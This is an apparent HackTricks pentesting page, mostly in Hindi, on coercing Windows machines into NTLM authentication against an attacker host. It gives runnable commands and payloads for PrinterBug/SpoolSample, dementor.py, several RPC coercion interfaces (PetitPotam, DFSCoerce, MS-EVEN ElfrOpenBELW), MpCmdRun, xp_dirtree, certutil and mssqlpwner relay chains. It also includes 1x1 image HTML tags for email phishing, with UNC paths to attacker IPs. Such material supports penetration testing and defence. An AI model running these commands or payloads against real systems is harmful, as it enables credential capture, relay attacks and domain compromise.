# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) **रिमोट ऑथेंटिकेशन ट्रिगर्स** का एक **संग्रह** है, जो C# में MIDL compiler का उपयोग करके कोडित है ताकि 3rd party dependencies से बचा जा सके।

## Spooler Service Abuse

यदि _**Print Spooler**_ service **सक्रिय** है, तो आप कुछ पहले से ज्ञात AD credentials का उपयोग करके Domain Controller के print server से नए print jobs पर एक **update** का **request** कर सकते हैं और इसे बता सकते हैं कि वह **notification किसी सिस्टम पर भेजे**।\
ध्यान दें कि जब प्रिंटर नोटिफिकेशन किसी मनमाने सिस्टम पर भेजता है, तो उसे उस **system** के विरुद्ध **authenticate against** करना पड़ता है। इसलिए, एक attacker _**Print Spooler**_ service को किसी मनमाने system के विरुद्ध authenticate against करने के लिए मजबूर कर सकता है, और सेवा इस authentication में **computer account** का उपयोग करेगी।

### Finding Windows Servers on the domain

Using PowerShell, get a list of Windows मशीनों. सर्वर आम तौर पर प्राथमिकता होते हैं, इसलिए आइए वहाँ ध्यान केंद्रित करें:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler सेवाएँ सुन रही हैं — पता लगाना

थोड़ी सी संशोधित @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) का उपयोग करके देखें कि Spooler Service सुन रही है या नहीं:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
आप Linux पर rpcdump.py का भी उपयोग कर सकते हैं और MS-RPRN Protocol की तलाश कर सकते हैं।
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### service से किसी arbitrary host के खिलाफ authenticate करने के लिए कहें

आप [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket) को compile कर सकते हैं.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
या [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) या [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) का उपयोग करें यदि आप Linux पर हैं
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combining with Unconstrained Delegation

यदि कोई attacker पहले से ही [Unconstrained Delegation](unconstrained-delegation.md) के साथ किसी कंप्यूटर को compromise कर चुका है, तो attacker प्रिंटर को इस कंप्यूटर के खिलाफ authenticate करने के लिए मजबूर कर सकता है। unconstrained delegation के कारण, प्रिंटर के कंप्यूटर अकाउंट का **TGT** उस unconstrained delegation वाले कंप्यूटर की **memory** में **saved** हो जाएगा। चूंकि attacker पहले से ही उस host को compromise कर चुका है, वह इस ticket को **retrieve** कर सकेगा और इसका दुरुपयोग कर सकेगा ([Pass the Ticket](pass-the-ticket.md))।

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: ये methods ऐसे parameters स्वीकार करते हैं जिनमें UNC path हो सकता है (उदा., `\\attacker\share`)। जब इन्हें process किया जाता है, तो Windows उस UNC पर authenticate करेगा (machine/user context), जिससे NetNTLM capture या relay संभव हो जाएगा।

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: लक्ष्य दिया गया backup log path खोलने का प्रयास करता है और attacker-controlled UNC पर authenticate करता है।
- Practical use: Tier 0 assets (DC/RODC/Citrix/etc.) को NetNTLM लौटाने के लिए coerce करना, और फिर उसे AD CS endpoints (ESC8/ESC11 scenarios) या अन्य privileged services पर relay करना।

## PrivExchange

The `PrivExchange` attack एक flaw का परिणाम है जो **Exchange Server `PushSubscription` feature** में पाया गया था। यह feature किसी भी mailbox वाले domain user को किसी भी client-provided host पर HTTP के जरिए Exchange server को authenticate करने के लिए मजबूर करने की अनुमति देती है।

By default, **Exchange service runs as SYSTEM** और इसे अत्यधिक privileges दिए जाते हैं (विशेषकर, इसे **WriteDacl privileges on the domain pre-2019 Cumulative Update** मिलते हैं)। इस flaw का उपयोग करके जानकारी को LDAP पर relay करना और उसके बाद domain NTDS database को extract करना संभव हो जाता है। जहाँ LDAP पर relaying संभव ना हो, वहाँ भी इस flaw का उपयोग domain के भीतर अन्य hosts पर relay और authenticate करने के लिए किया जा सकता है। इस attack के सफल exploitation से किसी भी authenticated domain user account के साथ तुरंत Domain Admin तक पहुँच मिल सकती है।

## Inside Windows

यदि आप पहले से Windows machine के अंदर हैं, तो आप privileged accounts का उपयोग करके Windows को किसी server से connect करने के लिए मजबूर कर सकते हैं:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
या इस अन्य तकनीक का उपयोग करें: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

यह संभव है कि certutil.exe lolbin (Microsoft-signed binary) का उपयोग करके NTLM authentication को coerce किया जाए:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### ईमेल के माध्यम से

यदि आप उस उपयोगकर्ता का **ईमेल पता** जानते हैं जो उस मशीन में लॉग इन करता है जिसे आप समझौता करना चाहते हैं, तो आप उसे बस एक **1x1 छवि वाला ईमेल** भेज सकते हैं, जैसे
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
और जब वह इसे खोलेगा, वह authenticate करने की कोशिश करेगा।

### MitM

यदि आप किसी कंप्यूटर पर MitM attack कर सकते हैं और किसी पृष्ठ में HTML inject कर सकते हैं जिसे वह देखेगा, तो आप पृष्ठ में निम्नलिखित जैसी एक image inject करने की कोशिश कर सकते हैं:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM प्रमाणीकरण को मजबूर करने और फ़िश करने के अन्य तरीके


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 क्रैक करना

यदि आप [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack) कैप्चर कर सकते हैं।\
_ध्यान रखें कि NTLMv1 क्रैक करने के लिए आपको Responder challenge को "1122334455667788" पर सेट करना होगा_

## संदर्भ
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
